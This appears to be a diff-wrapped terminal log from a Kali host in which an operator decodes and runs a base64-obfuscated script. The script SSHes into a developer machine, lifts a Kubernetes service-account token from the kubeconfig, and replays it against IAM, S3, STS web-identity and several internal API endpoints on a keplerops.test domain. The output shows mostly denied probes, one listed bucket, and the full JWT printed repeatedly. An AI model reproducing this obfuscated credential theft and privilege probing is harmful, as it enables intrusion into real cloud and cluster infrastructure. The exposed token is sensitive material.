@@ -1,0 +1,173 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r3.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKZXhwb3J0IEFXU19DQV9CVU5ETEU9L2hvbWUvcm93YW4vLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKSldUPSQoa3ViZWN0bCBjb25maWcgdmlldyAtLXJhdyAtbyBqc29ucGF0aD0ney51c2Vyc1swXS51c2VyLnRva2VufScpCkU9aHR0cHM6Ly9vYmplY3RzLmtlcGxlcm9wcy50ZXN0CmVjaG8gIj09PSBJQU0gPT09Igphd3MgLS1lbmRwb2ludC11cmwgJEUgaWFtIGxpc3Qtcm9sZXMgMj4mMSB8IGhlYWQgLTMwCmZvciByIGluIHJvd2FuLml0byByb3dhbi13b3Jrc3BhY2Ugc3VwcG9ydC1leHBvcnQgc3VwcG9ydC1leHBvcnQtcmVhZGVyIGZpZWxkbGluay1zdXBwb3J0LWV4cG9ydCBleHBvcnQtcmVhZGVyIGZpZWxkbGluay1leHBvcnQtcmVhZGVyIHdvcmtsb2FkIGZpZWxkbGluay13b3JrbG9hZCBzdXBwb3J0OyBkbwogIGVjaG8gIi0tIGdldC1yb2xlICRyIjsgYXdzIC0tZW5kcG9pbnQtdXJsICRFIGlhbSBnZXQtcm9sZSAtLXJvbGUtbmFtZSAiJHIiIDI+JjEgfCBoZWFkIC0yMApkb25lCmVjaG8gIj09PSBTMyBsaXN0LWJ1Y2tldHMgPT09Igphd3MgLS1lbmRwb2ludC11cmwgJEUgczNhcGkgbGlzdC1idWNrZXRzIDI+JjEgfCBoZWFkIC0zMAphd3MgLS1lbmRwb2ludC11cmwgJEUgczMgbHMgMj4mMSB8IGhlYWQgLTIwCmVjaG8gIj09PSBTVFMgd2ViIGlkZW50aXR5ID09PSIKZm9yIHIgaW4gcm93YW4td29ya3NwYWNlIGZpZWxkbGluay13b3JrbG9hZCB3b3JrbG9hZCBzdXBwb3J0LWV4cG9ydCBzdXBwb3J0LWV4cG9ydC1yZWFkZXIgZmllbGRsaW5rLXN1cHBvcnQtZXhwb3J0IGV4cG9ydC1yZWFkZXI7IGRvCiAgZWNobyAiLS0gJHIiCiAgYXdzIC0tZW5kcG9pbnQtdXJsICRFIHN0cyBhc3N1bWUtcm9sZS13aXRoLXdlYi1pZGVudGl0eSAtLXJvbGUtYXJuICJhcm46YXdzOmlhbTo6MDAwMDAwMDAwMDAwOnJvbGUvJHIiIC0tcm9sZS1zZXNzaW9uLW5hbWUgcHJvYmUgLS13ZWItaWRlbnRpdHktdG9rZW4gIiRKV1QiIDI+JjEgfCBoZWFkIC04CmRvbmUKZWNobyAiPT09IENMT1VELUFQSSBNSVNDID09PSIKQz1odHRwczovL2Nsb3VkLWFwaS5rZXBsZXJvcHMudGVzdApmb3IgcCBpbiBvcGVuYXBpLmpzb24gYXBpL29wZW5hcGkuanNvbiBkb2NzIGFwaSBkb2NzL29wZW5hcGkuanNvbiBhcGk7IGRvCiAgY29kZT0kKGN1cmwgLXNTayAtbSA2IC1vIC90bXAvYyAtdyAnJXtodHRwX2NvZGV9JyAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRKV1QiICIkQy8kcCIpCiAgZWNobyAiLS0gJHAgLT4gJGNvZGUgOjogJChoZWFkIC1jIDQwMCAvdG1wL2MgfCB0ciAnXG4nICcgJykiCmRvbmUKZWNobyAiPT09IEFVVEggSEVBREVSIFZBUklBTlRTIHRydXN0IFRSLTEgPT09Igpmb3IgaCBpbiAiWC1Xb3JrbG9hZC1Ub2tlbjogJEpXVCIgIlgtV29ya2xvYWQtSWRlbnRpdHk6ICRKV1QiICJYLUlkZW50aXR5LVRva2VuOiAkSldUIiAiV29ya2xvYWQtVG9rZW46ICRKV1QiICJYLVdvcmtsb2FkOiAkSldUIiAiQXV0aG9yaXphdGlvbjogV29ya2xvYWQgJEpXVCIgIkF1dGhvcml6YXRpb246IEJlYXJlciB3b3JrbG9hZDokSldUIjsgZG8KICBjb2RlPSQoY3VybCAtc1NrIC1tIDYgLW8gL3RtcC9jIC13ICcle2h0dHBfY29kZX0nIC1IICIkaCIgIiRDL2FwaS90cnVzdC1yZWNvcmRzL1RSLTEiKQogIGVjaG8gIi0tIFskaF0gLT4gJGNvZGUgOjogJChoZWFkIC1jIDIwMCAvdG1wL2MgfCB0ciAnXG4nICcgJykiCmRvbmUKZm9yIHEgaW4gIndvcmtsb2FkX3Rva2VuPSRKV1QiICJ0b2tlbj0kSldUIiAid29ya2xvYWQ9JEpXVCI7IGRvCiAgY29kZT0kKGN1cmwgLXNTayAtbSA2IC1vIC90bXAvYyAtdyAnJXtodHRwX2NvZGV9JyAiJEMvYXBpL3RydXN0LXJlY29yZHMvVFItMT8kcSIpCiAgZWNobyAiLS0gcXVlcnkgJHEgLT4gJGNvZGUgOjogJChoZWFkIC1jIDIwMCAvdG1wL2MgfCB0ciAnXG4nICcgJykiCmRvbmUKZWNobyAiPT09IFdPUktMT0FEUyBQUk9CRVMgKEJlYXJlciBKV1QpID09PSIKZm9yIGggaW4gd29ya2xvYWRzIHdvcmtsb2FkIGlkIGlkZW50aXR5OyBkbwogZm9yIHAgaW4gYXBpIGFwaS93b3JrbG9hZHMgYXBpL3dvcmtsb2Fkcy9jdXJyZW50IGFwaS93b3JrbG9hZHMvY3VycmVudC90b2tlbiBhcGkvd29ya3NwYWNlcyBhcGkvd29ya3NwYWNlcy9jdXJyZW50IGFwaS93b3Jrc3BhY2VzL2N1cnJlbnQvdG9rZW4gYXBpL3Rva2VuIGFwaS9pZGVudGl0eSBhcGkvdHJ1c3QtcmVjb3Jkcy9UUi0xIGFwaS90b2tlbi1leGNoYW5nZS9yb3dhbi13b3Jrc3BhY2U7IGRvCiAgY29kZT0kKGN1cmwgLXNTayAtbSA2IC1vIC90bXAvYyAtdyAnJXtodHRwX2NvZGV9JyAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRKV1QiICJodHRwczovLyRoLmtlcGxlcm9wcy50ZXN0LyRwIikKICBlY2hvICItLSAkaC8kcCAtPiAkY29kZSA6OiAkKGhlYWQgLWMgMTYwIC90bXAvYyB8IHRyICdcbicgJyAnKSIKIGRvbmUKZG9uZQplY2hvICI9PT0gSUQgUk9PVC9XRUxMS05PV04gPT09Igpmb3IgdSBpbiBodHRwczovL2lkLmtlcGxlcm9wcy50ZXN0LyBodHRwczovL2lkLmtlcGxlcm9wcy50ZXN0Ly53ZWxsLWtub3duL2ZpZWxka2VzdC1jbGllbnQgaHR0cHM6Ly9pZC5rZXBsZXJvcHMudGVzdC8ud2VsbC1rbm93bi9vcGVuaWQtY29uZmlndXJhdGlvbjsgZG8KIGVjaG8gIi0tICR1IjsgY3VybCAtc1NrIC1tIDYgLWkgIiR1IiB8IGhlYWQgLWMgNzAwOyBlY2hvCmRvbmUKUlNICmVjaG8gRE9ORV9LMTRfUjMK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r3.sh; bash /tmp/k14_r3.sh; echo DONEMARK_1795199128494$((6*7))
+=== IAM ===
+
+An error occurred (AccessDenied) when calling the ListRoles operation: Access Denied.
+-- get-role rowan.ito
+
+An error occurred (AccessDenied) when calling the GetRole operation: Access Denied.
+-- get-role rowan-workspace
+
+An error occurred (AccessDenied) when calling the GetRole operation: Access Denied.
+-- get-role support-export
+
+An error occurred (AccessDenied) when calling the GetRole operation: Access Denied.
+-- get-role support-export-reader
+
+An error occurred (AccessDenied) when calling the GetRole operation: Access Denied.
+-- get-role fieldlink-support-export
+
+An error occurred (AccessDenied) when calling the GetRole operation: Access Denied.
+-- get-role export-reader
+
+An error occurred (AccessDenied) when calling the GetRole operation: Access Denied.
+-- get-role fieldlink-export-reader
+
+An error occurred (AccessDenied) when calling the GetRole operation: Access Denied.
+-- get-role workload
+
+An error occurred (AccessDenied) when calling the GetRole operation: Access Denied.
+-- get-role fieldlink-workload
+
+An error occurred (AccessDenied) when calling the GetRole operation: Access Denied.
+-- get-role support
+
+An error occurred (AccessDenied) when calling the GetRole operation: Access Denied.
+=== S3 list-buckets ===
+{
+    "Buckets": [
+        {
+            "Name": "fieldlink-exports",
+            "CreationDate": "2026-11-19T07:11:39+00:00"
+        }
+    ],
+    "Owner": {
+        "DisplayName": "rowan.ito",
+        "ID": "rowan.ito"
+    }
+}
+2026-11-19 07:11:39 fieldlink-exports
+=== STS web identity ===
+-- rowan-workspace
+
+An error occurred (AccessDenied) when calling the AssumeRoleWithWebIdentity operation: role not found: rowan-workspace
+-- fieldlink-workload
+
+An error occurred (AccessDenied) when calling the AssumeRoleWithWebIdentity operation: role not found: fieldlink-workload
+-- workload
+
+An error occurred (AccessDenied) when calling the AssumeRoleWithWebIdentity operation: role not found: workload
+-- support-export
+
+An error occurred (AccessDenied) when calling the AssumeRoleWithWebIdentity operation: role not found: support-export
+-- support-export-reader
+
+An error occurred (AccessDenied) when calling the AssumeRoleWithWebIdentity operation: role not found: support-export-reader
+-- fieldlink-support-export
+
+An error occurred (AccessDenied) when calling the AssumeRoleWithWebIdentity operation: role not found: fieldlink-support-export
+-- export-reader
+
+An error occurred (AccessDenied) when calling the AssumeRoleWithWebIdentity operation: role not found: export-reader
+=== CLOUD-API MISC ===
+-- openapi.json -> 401 :: {"error":"authentication_required"} 
+-- api/openapi.json -> 401 :: {"error":"authentication_required"} 
+-- docs -> 401 :: {"error":"authentication_required"} 
+-- api -> 401 :: {"error":"authentication_required"} 
+-- docs/openapi.json -> 401 :: {"error":"authentication_required"} 
+-- api -> 401 :: {"error":"authentication_required"} 
+=== AUTH HEADER VARIANTS trust TR-1 ===
+-- [X-Workload-Token: eyJhbGciOiJSUzI1NiIsImtpZCI6ImlaekpKU0hrTDFqaEtzVk1yQXhCTG9QaVc0ZUlaNDVHclhrcTVWZUxmVXcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk3NjY0MDQ0LCJpYXQiOjE3OTUwNzIwNDQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZjFhNTNhNGEtZmIxNi00ZDJlLWI2MWItNjMyNzYzNWYzYjAzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmaWVsZGxpbmsiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoicm93YW4td29ya3NwYWNlIiwidWlkIjoiY2FiNzY1MDUtNmNjMS00OTNkLTliNjgtMmE0NzRiMWQzMjA0In19LCJuYmYiOjE3OTUwNzIwNDQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpmaWVsZGxpbms6cm93YW4td29ya3NwYWNlIn0.Dc8hMkZDkZnjZ0PgPnZp7qS9xJ3_uO_38_LJM1-4z5rlkHBQMD92S9jZ7zStGg5G8m93Lg0yQ1v3OSA6kCkAJyVOOWdxSgc8Z2p8ptxNPjiC3oiFHwRpInnoF-XG8DPUnQpcojvE7XdPWzamY3tWtMSJZWuvPwvQwVj1xFPWRmlQIhol8TvNBUG85sg0R4FeYUqs8BY3sOC79NskKMtAxwQ9O8Am9kl1eSPiXhqAQMQDA6TduozxwOjBdn34DIPRB_PX6sVKniYZoG9SpZTpYQ7_UKYsg8cjvxQ_FWaM4OOUdU5BzIt-nskpp_5cGFf0XmVESdw-GzstqP9Cyeu2wg] -> 401 :: {"error":"workload_token_required"} 
+-- [X-Workload-Identity: eyJhbGciOiJSUzI1NiIsImtpZCI6ImlaekpKU0hrTDFqaEtzVk1yQXhCTG9QaVc0ZUlaNDVHclhrcTVWZUxmVXcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk3NjY0MDQ0LCJpYXQiOjE3OTUwNzIwNDQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZjFhNTNhNGEtZmIxNi00ZDJlLWI2MWItNjMyNzYzNWYzYjAzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmaWVsZGxpbmsiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoicm93YW4td29ya3NwYWNlIiwidWlkIjoiY2FiNzY1MDUtNmNjMS00OTNkLTliNjgtMmE0NzRiMWQzMjA0In19LCJuYmYiOjE3OTUwNzIwNDQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpmaWVsZGxpbms6cm93YW4td29ya3NwYWNlIn0.Dc8hMkZDkZnjZ0PgPnZp7qS9xJ3_uO_38_LJM1-4z5rlkHBQMD92S9jZ7zStGg5G8m93Lg0yQ1v3OSA6kCkAJyVOOWdxSgc8Z2p8ptxNPjiC3oiFHwRpInnoF-XG8DPUnQpcojvE7XdPWzamY3tWtMSJZWuvPwvQwVj1xFPWRmlQIhol8TvNBUG85sg0R4FeYUqs8BY3sOC79NskKMtAxwQ9O8Am9kl1eSPiXhqAQMQDA6TduozxwOjBdn34DIPRB_PX6sVKniYZoG9SpZTpYQ7_UKYsg8cjvxQ_FWaM4OOUdU5BzIt-nskpp_5cGFf0XmVESdw-GzstqP9Cyeu2wg] -> 401 :: {"error":"workload_token_required"} 
+-- [X-Identity-Token: eyJhbGciOiJSUzI1NiIsImtpZCI6ImlaekpKU0hrTDFqaEtzVk1yQXhCTG9QaVc0ZUlaNDVHclhrcTVWZUxmVXcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk3NjY0MDQ0LCJpYXQiOjE3OTUwNzIwNDQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZjFhNTNhNGEtZmIxNi00ZDJlLWI2MWItNjMyNzYzNWYzYjAzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmaWVsZGxpbmsiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoicm93YW4td29ya3NwYWNlIiwidWlkIjoiY2FiNzY1MDUtNmNjMS00OTNkLTliNjgtMmE0NzRiMWQzMjA0In19LCJuYmYiOjE3OTUwNzIwNDQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpmaWVsZGxpbms6cm93YW4td29ya3NwYWNlIn0.Dc8hMkZDkZnjZ0PgPnZp7qS9xJ3_uO_38_LJM1-4z5rlkHBQMD92S9jZ7zStGg5G8m93Lg0yQ1v3OSA6kCkAJyVOOWdxSgc8Z2p8ptxNPjiC3oiFHwRpInnoF-XG8DPUnQpcojvE7XdPWzamY3tWtMSJZWuvPwvQwVj1xFPWRmlQIhol8TvNBUG85sg0R4FeYUqs8BY3sOC79NskKMtAxwQ9O8Am9kl1eSPiXhqAQMQDA6TduozxwOjBdn34DIPRB_PX6sVKniYZoG9SpZTpYQ7_UKYsg8cjvxQ_FWaM4OOUdU5BzIt-nskpp_5cGFf0XmVESdw-GzstqP9Cyeu2wg] -> 401 :: {"error":"workload_token_required"} 
+-- [Workload-Token: eyJhbGciOiJSUzI1NiIsImtpZCI6ImlaekpKU0hrTDFqaEtzVk1yQXhCTG9QaVc0ZUlaNDVHclhrcTVWZUxmVXcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk3NjY0MDQ0LCJpYXQiOjE3OTUwNzIwNDQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZjFhNTNhNGEtZmIxNi00ZDJlLWI2MWItNjMyNzYzNWYzYjAzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmaWVsZGxpbmsiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoicm93YW4td29ya3NwYWNlIiwidWlkIjoiY2FiNzY1MDUtNmNjMS00OTNkLTliNjgtMmE0NzRiMWQzMjA0In19LCJuYmYiOjE3OTUwNzIwNDQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpmaWVsZGxpbms6cm93YW4td29ya3NwYWNlIn0.Dc8hMkZDkZnjZ0PgPnZp7qS9xJ3_uO_38_LJM1-4z5rlkHBQMD92S9jZ7zStGg5G8m93Lg0yQ1v3OSA6kCkAJyVOOWdxSgc8Z2p8ptxNPjiC3oiFHwRpInnoF-XG8DPUnQpcojvE7XdPWzamY3tWtMSJZWuvPwvQwVj1xFPWRmlQIhol8TvNBUG85sg0R4FeYUqs8BY3sOC79NskKMtAxwQ9O8Am9kl1eSPiXhqAQMQDA6TduozxwOjBdn34DIPRB_PX6sVKniYZoG9SpZTpYQ7_UKYsg8cjvxQ_FWaM4OOUdU5BzIt-nskpp_5cGFf0XmVESdw-GzstqP9Cyeu2wg] -> 401 :: {"error":"workload_token_required"} 
+-- [X-Workload: eyJhbGciOiJSUzI1NiIsImtpZCI6ImlaekpKU0hrTDFqaEtzVk1yQXhCTG9QaVc0ZUlaNDVHclhrcTVWZUxmVXcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk3NjY0MDQ0LCJpYXQiOjE3OTUwNzIwNDQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZjFhNTNhNGEtZmIxNi00ZDJlLWI2MWItNjMyNzYzNWYzYjAzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmaWVsZGxpbmsiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoicm93YW4td29ya3NwYWNlIiwidWlkIjoiY2FiNzY1MDUtNmNjMS00OTNkLTliNjgtMmE0NzRiMWQzMjA0In19LCJuYmYiOjE3OTUwNzIwNDQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpmaWVsZGxpbms6cm93YW4td29ya3NwYWNlIn0.Dc8hMkZDkZnjZ0PgPnZp7qS9xJ3_uO_38_LJM1-4z5rlkHBQMD92S9jZ7zStGg5G8m93Lg0yQ1v3OSA6kCkAJyVOOWdxSgc8Z2p8ptxNPjiC3oiFHwRpInnoF-XG8DPUnQpcojvE7XdPWzamY3tWtMSJZWuvPwvQwVj1xFPWRmlQIhol8TvNBUG85sg0R4FeYUqs8BY3sOC79NskKMtAxwQ9O8Am9kl1eSPiXhqAQMQDA6TduozxwOjBdn34DIPRB_PX6sVKniYZoG9SpZTpYQ7_UKYsg8cjvxQ_FWaM4OOUdU5BzIt-nskpp_5cGFf0XmVESdw-GzstqP9Cyeu2wg] -> 401 :: {"error":"workload_token_required"} 
+-- [Authorization: Workload eyJhbGciOiJSUzI1NiIsImtpZCI6ImlaekpKU0hrTDFqaEtzVk1yQXhCTG9QaVc0ZUlaNDVHclhrcTVWZUxmVXcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk3NjY0MDQ0LCJpYXQiOjE3OTUwNzIwNDQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZjFhNTNhNGEtZmIxNi00ZDJlLWI2MWItNjMyNzYzNWYzYjAzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmaWVsZGxpbmsiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoicm93YW4td29ya3NwYWNlIiwidWlkIjoiY2FiNzY1MDUtNmNjMS00OTNkLTliNjgtMmE0NzRiMWQzMjA0In19LCJuYmYiOjE3OTUwNzIwNDQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpmaWVsZGxpbms6cm93YW4td29ya3NwYWNlIn0.Dc8hMkZDkZnjZ0PgPnZp7qS9xJ3_uO_38_LJM1-4z5rlkHBQMD92S9jZ7zStGg5G8m93Lg0yQ1v3OSA6kCkAJyVOOWdxSgc8Z2p8ptxNPjiC3oiFHwRpInnoF-XG8DPUnQpcojvE7XdPWzamY3tWtMSJZWuvPwvQwVj1xFPWRmlQIhol8TvNBUG85sg0R4FeYUqs8BY3sOC79NskKMtAxwQ9O8Am9kl1eSPiXhqAQMQDA6TduozxwOjBdn34DIPRB_PX6sVKniYZoG9SpZTpYQ7_UKYsg8cjvxQ_FWaM4OOUdU5BzIt-nskpp_5cGFf0XmVESdw-GzstqP9Cyeu2wg] -> 401 :: {"error":"workload_token_required"} 
+-- [Authorization: Bearer workload:eyJhbGciOiJSUzI1NiIsImtpZCI6ImlaekpKU0hrTDFqaEtzVk1yQXhCTG9QaVc0ZUlaNDVHclhrcTVWZUxmVXcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk3NjY0MDQ0LCJpYXQiOjE3OTUwNzIwNDQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZjFhNTNhNGEtZmIxNi00ZDJlLWI2MWItNjMyNzYzNWYzYjAzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmaWVsZGxpbmsiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoicm93YW4td29ya3NwYWNlIiwidWlkIjoiY2FiNzY1MDUtNmNjMS00OTNkLTliNjgtMmE0NzRiMWQzMjA0In19LCJuYmYiOjE3OTUwNzIwNDQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpmaWVsZGxpbms6cm93YW4td29ya3NwYWNlIn0.Dc8hMkZDkZnjZ0PgPnZp7qS9xJ3_uO_38_LJM1-4z5rlkHBQMD92S9jZ7zStGg5G8m93Lg0yQ1v3OSA6kCkAJyVOOWdxSgc8Z2p8ptxNPjiC3oiFHwRpInnoF-XG8DPUnQpcojvE7XdPWzamY3tWtMSJZWuvPwvQwVj1xFPWRmlQIhol8TvNBUG85sg0R4FeYUqs8BY3sOC79NskKMtAxwQ9O8Am9kl1eSPiXhqAQMQDA6TduozxwOjBdn34DIPRB_PX6sVKniYZoG9SpZTpYQ7_UKYsg8cjvxQ_FWaM4OOUdU5BzIt-nskpp_5cGFf0XmVESdw-GzstqP9Cyeu2wg] -> 502 :: {"error":"k3s_returned_401"} 
+-- query workload_token=eyJhbGciOiJSUzI1NiIsImtpZCI6ImlaekpKU0hrTDFqaEtzVk1yQXhCTG9QaVc0ZUlaNDVHclhrcTVWZUxmVXcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk3NjY0MDQ0LCJpYXQiOjE3OTUwNzIwNDQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZjFhNTNhNGEtZmIxNi00ZDJlLWI2MWItNjMyNzYzNWYzYjAzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmaWVsZGxpbmsiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoicm93YW4td29ya3NwYWNlIiwidWlkIjoiY2FiNzY1MDUtNmNjMS00OTNkLTliNjgtMmE0NzRiMWQzMjA0In19LCJuYmYiOjE3OTUwNzIwNDQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpmaWVsZGxpbms6cm93YW4td29ya3NwYWNlIn0.Dc8hMkZDkZnjZ0PgPnZp7qS9xJ3_uO_38_LJM1-4z5rlkHBQMD92S9jZ7zStGg5G8m93Lg0yQ1v3OSA6kCkAJyVOOWdxSgc8Z2p8ptxNPjiC3oiFHwRpInnoF-XG8DPUnQpcojvE7XdPWzamY3tWtMSJZWuvPwvQwVj1xFPWRmlQIhol8TvNBUG85sg0R4FeYUqs8BY3sOC79NskKMtAxwQ9O8Am9kl1eSPiXhqAQMQDA6TduozxwOjBdn34DIPRB_PX6sVKniYZoG9SpZTpYQ7_UKYsg8cjvxQ_FWaM4OOUdU5BzIt-nskpp_5cGFf0XmVESdw-GzstqP9Cyeu2wg -> 401 :: {"error":"workload_token_required"} 
+-- query token=eyJhbGciOiJSUzI1NiIsImtpZCI6ImlaekpKU0hrTDFqaEtzVk1yQXhCTG9QaVc0ZUlaNDVHclhrcTVWZUxmVXcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk3NjY0MDQ0LCJpYXQiOjE3OTUwNzIwNDQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZjFhNTNhNGEtZmIxNi00ZDJlLWI2MWItNjMyNzYzNWYzYjAzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmaWVsZGxpbmsiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoicm93YW4td29ya3NwYWNlIiwidWlkIjoiY2FiNzY1MDUtNmNjMS00OTNkLTliNjgtMmE0NzRiMWQzMjA0In19LCJuYmYiOjE3OTUwNzIwNDQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpmaWVsZGxpbms6cm93YW4td29ya3NwYWNlIn0.Dc8hMkZDkZnjZ0PgPnZp7qS9xJ3_uO_38_LJM1-4z5rlkHBQMD92S9jZ7zStGg5G8m93Lg0yQ1v3OSA6kCkAJyVOOWdxSgc8Z2p8ptxNPjiC3oiFHwRpInnoF-XG8DPUnQpcojvE7XdPWzamY3tWtMSJZWuvPwvQwVj1xFPWRmlQIhol8TvNBUG85sg0R4FeYUqs8BY3sOC79NskKMtAxwQ9O8Am9kl1eSPiXhqAQMQDA6TduozxwOjBdn34DIPRB_PX6sVKniYZoG9SpZTpYQ7_UKYsg8cjvxQ_FWaM4OOUdU5BzIt-nskpp_5cGFf0XmVESdw-GzstqP9Cyeu2wg -> 401 :: {"error":"workload_token_required"} 
+-- query workload=eyJhbGciOiJSUzI1NiIsImtpZCI6ImlaekpKU0hrTDFqaEtzVk1yQXhCTG9QaVc0ZUlaNDVHclhrcTVWZUxmVXcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk3NjY0MDQ0LCJpYXQiOjE3OTUwNzIwNDQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZjFhNTNhNGEtZmIxNi00ZDJlLWI2MWItNjMyNzYzNWYzYjAzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmaWVsZGxpbmsiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoicm93YW4td29ya3NwYWNlIiwidWlkIjoiY2FiNzY1MDUtNmNjMS00OTNkLTliNjgtMmE0NzRiMWQzMjA0In19LCJuYmYiOjE3OTUwNzIwNDQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpmaWVsZGxpbms6cm93YW4td29ya3NwYWNlIn0.Dc8hMkZDkZnjZ0PgPnZp7qS9xJ3_uO_38_LJM1-4z5rlkHBQMD92S9jZ7zStGg5G8m93Lg0yQ1v3OSA6kCkAJyVOOWdxSgc8Z2p8ptxNPjiC3oiFHwRpInnoF-XG8DPUnQpcojvE7XdPWzamY3tWtMSJZWuvPwvQwVj1xFPWRmlQIhol8TvNBUG85sg0R4FeYUqs8BY3sOC79NskKMtAxwQ9O8Am9kl1eSPiXhqAQMQDA6TduozxwOjBdn34DIPRB_PX6sVKniYZoG9SpZTpYQ7_UKYsg8cjvxQ_FWaM4OOUdU5BzIt-nskpp_5cGFf0XmVESdw-GzstqP9Cyeu2wg -> 401 :: {"error":"workload_token_required"} 
+=== WORKLOADS PROBES (Bearer JWT) ===
+-- workloads/api -> 401 :: {"error":"authentication_required"} 
+-- workloads/api/workloads -> 401 :: {"error":"authentication_required"} 
+-- workloads/api/workloads/current -> 401 :: {"error":"authentication_required"} 
+-- workloads/api/workloads/current/token -> 401 :: {"error":"authentication_required"} 
+-- workloads/api/workspaces -> 401 :: {"error":"authentication_required"} 
+-- workloads/api/workspaces/current -> 401 :: {"error":"authentication_required"} 
